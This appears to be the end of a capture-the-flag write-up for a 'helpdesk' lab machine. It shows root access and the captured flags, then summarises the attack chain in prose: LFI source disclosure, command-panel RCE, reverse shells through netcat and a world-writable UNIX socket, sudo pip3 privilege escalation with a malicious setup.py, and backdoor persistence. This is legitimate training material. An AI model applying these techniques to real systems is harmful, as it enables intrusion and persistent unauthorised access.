uid=0(root) gid=0(root) groups=0(root)
root
helpdesk
```

### Flag Capture

```bash
root@helpdesk:~# cat /home/helpdesk/user.txt /root/root.txt
flag{ti[REDACTED]}
flag{re[REDACTED]}
```

**ROOTED**

---

## Attack Chain Summary

1. **Reconnaissance**: Network scanning identified target at 192.168.100.105 with SSH (22) and HTTP (80) services. Web enumeration discovered administrative endpoints including `login.php`, `panel.php`, and `ticket.php`.

2. **Vulnerability Discovery**: Parameter fuzzing revealed an LFI vulnerability in `ticket.php` via the `url` GET parameter. PHP filter wrappers (`php://filter/convert.base64-encode/resource=`) were used to extract source code of `login.php`, exposing hardcoded credentials (`helpdesk:ti[REDACTED]`) in plaintext comments.

3. **Exploitation**: Authenticated to the admin panel using discovered credentials, gaining access to a Remote Command Panel at `panel.php`. The panel executed arbitrary system commands via `shell_exec()` without sanitization, allowing RCE as the `www-data` user. A BusyBox netcat reverse shell was established.

4. **Internal Enumeration**: Post-exploitation reconnaissance discovered an insecure UNIX domain socket at `/opt/helpdesk-socket/helpdesk.sock` with world-writable permissions (777). The socket handler (`handler.sh`) executed arbitrary bash commands without validation, running with `helpdesk` user privileges.

5. **Lateral Movement**: Exploited the UNIX socket by sending a base64-encoded reverse shell payload through `socat`, escalating from `www-data` to the `helpdesk` user.

6. **Privilege Escalation**: Enumeration of sudo permissions revealed `helpdesk` could execute `/usr/bin/pip3 install --break-system-packages *` as root without a password. Created a malicious `setup.py` file that spawned a root shell via `os.system()` during pip installation, achieving full root access.

7. **Post-Exploitation**: Established persistent access by creating sudo entries for `mrmidnight` user and resetting the password, enabling SSH access with sudo privileges to root. Retrieved user and root flags.

